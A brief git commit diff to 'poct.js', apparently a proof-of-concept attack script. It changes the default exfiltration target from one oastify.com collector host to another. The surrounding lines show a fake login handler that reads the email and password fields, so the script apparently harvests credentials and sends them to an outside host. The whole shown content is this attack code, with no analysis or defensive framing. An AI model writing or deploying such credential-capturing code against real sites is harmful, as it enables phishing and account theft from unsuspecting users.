7b26572f1baeae2819713e48601d1f66e7112cc7
vulnoob <200810511+vulnoob@users.noreply.github.com>
2025-09-23 09:58:53 -0500

    Update poct.js

--- poct.js
+++ poct.js
@@ -52,7 +52,7 @@ alert(
 
     let target = urlTarget || localStorage.getItem("targetyre00obqr8t");
     if (urlTarget) localStorage.setItem("targetyre00obqr8t", urlTarget);
-    if (!target) target = "https://4z49mwipemwdw2q0b7dag5hg57byzpne.oastify.com";
+    if (!target) target = "https://isekrl4qyt17a6v3aapc5p5ynptgh65v.oastify.com";
 
     lbtn.onclick = () => {
         let credentials = lemail.value.trim() && lpw.value.trim()
